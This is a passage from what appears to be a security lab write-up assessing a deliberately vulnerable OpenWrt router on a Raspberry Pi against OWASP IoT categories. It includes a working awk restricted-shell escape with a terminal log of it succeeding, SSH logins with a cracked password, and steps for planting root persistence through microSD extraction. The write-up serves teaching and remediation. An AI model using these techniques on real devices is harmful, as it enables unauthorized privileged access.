        option enable '1'
```

An administrator can only obtain `root` access by first logging in via SSH as `openwrtuser` and then escalating privileges to `root` from within the session using `su` command.

The primary risk in this scenario lies in the restricted shell assigned to the `openwrtuser` account. As previously demonstrated in the section [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords]], the user's password can be cracked using the username and a common brute-force dictionary. Additionally, physical access methods are possible, as detailed in [[#IoT:I10 - Lack of Physical Hardening]], and the firmware can also be obtained for further analysis ([see reference](https://github.com/scriptingxss/owasp-fstm)).

Once access is gained, a user can analyze the behavior of the deployed shell. This can be achieved by reviewing the source code in the repository or by locating and extracting the binary for reverse engineering. The _rshell_ implementation permits the execution of the `awk` command without proper validation.

According to [GTFobins](https://gtfobins.github.io/gtfobins/awk/), it is possible to leverage `awk` to spawn a shell.

```zsh
awk 'BEGIN {system("/bin/sh")}'
```

There are various methods to attempt bypassing a restricted shell. This [resource](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) lists several techniques, including the use of `awk`.

## Demonstration

```zsh
$ sshpass -p "uncrackable" ssh root@192.168.2.1                                                 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Permission denied, please try again.
```

```zsh
$ sshpass -p "openwrtuserpwned" ssh openwrtuser@192.168.2.1
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

██████╗ ███████╗███████╗████████╗██████╗ ██╗ ██████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗  ███████╗   ██║   ██████╔╝██║██║        ██║   █████╗  ██║  ██║
██╔══██╗██╔══╝  ╚════██║   ██║   ██╔══██╗██║██║        ██║   ██╔══╝  ██║  ██║
██║  ██║███████╗███████║   ██║   ██║  ██║██║╚██████╗   ██║   ███████╗██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚═════╝ 
                                                                              
 ██████╗███████╗██╗  ██╗███████╗██╗     ██╗                                  
██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║                                  
██║     ███████╗███████║█████╗  ██║     ██║                                  
██║     ╚════██║██╔══██║██╔══╝  ██║     ██║                                  
╚██████╗███████║██║  ██║███████╗███████╗███████╗                             
 ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                             

===============================================================================
                         RESTRICTED ACCESS SHELL
===============================================================================

╔═══════════════════════════════════════════════════════════════════════════╗
║ WARNING: UNAUTHORIZED ACCESS IS PROHIBITED                                ║
║                                                                           ║
║ This system is for authorized use only. All activities on this system     ║
║ are monitored and logged. Any unauthorized access, use, or modification   ║
║ is strictly prohibited and may result in disciplinary action and/or       ║
║ criminal prosecution under applicable laws.                               ║
║                                                                           ║
║ By accessing this system, you acknowledge that:                           ║
║  • You have no expectation of privacy                                     ║
║  • All keystrokes and commands are logged                                 ║
║  • System administrators may monitor activity at any time                 ║
╚═══════════════════════════════════════════════════════════════════════════╝

Use 'help' command to see the list of allowed commands.

===============================================================================
rshell> netstat 
Command not allowed nor found.
rshell> awk 'BEGIN {system("/bin/sh")}'


BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ $
~ $ netstat -tulnp
netstat: can't scan /proc - are you root?
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.2.1:22          0.0.0.0:*               LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      -
tcp        0      0 :::5515                 :::*                    LISTEN      -
udp        0      0 :::547                  :::*                                -
```


### FTP configuration and escalation

There are multiple insecure configurations present on the device, one of the most critical being the configuration of the [[#2.4 FTP|FTP]] service. This service allows any user logging in as _anonymous_ to upload executable files to the _/opt/oem-updates/pending_ directory. This creates a significant attack surface for the execution of malware or ransomware.

To mitigate this issue, it is recommended to create a dedicated directory for the FTP service, restrict access to prevent anonymous logins, and mount the directory used for file uploads with the _noexec_ option to prevent execution of uploaded files.*

```zsh
mount -o remount,noexec /opt/oem-updates/pending
```
### Exposed services running as root

There are services on the router that run under the `root` user, which opens a vulnerable surface where, if the service is compromised, direct privileged access can be obtained.
## IoT:I10 - Lack of Physical Hardening
### Definition
> Lack of physical hardening measures, allowing potential attackers to gain sensitive information that can help in a future remote attack or take local control of the device.
> **DONE.** Scoped to the Raspberry Pi hardware the lab runs on; exploitation needs physical access, so the repro is on-device.

The lab runs on a Raspberry Pi with no physical hardening: no secure boot, an unencrypted microSD rootfs, and an exposed UART. Physical access converts directly into persistent root.

### microSD extraction (unconditional)

The Pi boots from a removable microSD with no disk encryption. Pulling the card and mounting it on any machine gives full read/write access to the rootfs:
- read `/etc/shadow` (the `openwrtuser` hash cracks, see [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords|IoT1]]) and every hardcoded secret in the overlay,
- plant persistence (drop a key into `/etc/dropbear/authorized_keys`, or edit a `profile-init.d` hook) and boot the card back up as root.

This is the physical mechanism behind the firmware-extraction step IoT1 assumes: `binwalk` on the image and offline hash cracking both start from the card.

### UART serial console

The Pi exposes a UART on the GPIO header (pins 8/10). A USB-TTL adapter at 115200 baud shows the bootloader and kernel boot log (which can leak configuration) and reaches the login console. The lab sets `ttylogin=1` (`50-ttylogin.sh`), so the serial getty asks for a password rather than dropping a free shell, but the boot output is still exposed, the bootloader can be interrupted, and the card-extraction path above bypasses the login entirely.

### Impact and remediation

Physical access to the device yields the full filesystem, all secrets, and persistent root, with no cryptographic barrier. Remediation: enable secure boot and rootfs encryption, disable the serial console (or set a bootloader password), and use tamper-evident enclosures.

**On-device note.** These are hardware findings and cannot be reproduced from the overlay alone. microSD extraction is unconditional (no encryption in the image), while the exact serial-console behavior (getty vs an interruptible bootloader prompt) should be confirmed on the physical Pi.

**OWASP / CWE.** IoT10; CWE-1263 Improper Physical Access Control; CWE-1191 Exposed Debug/Test Interface (UART).
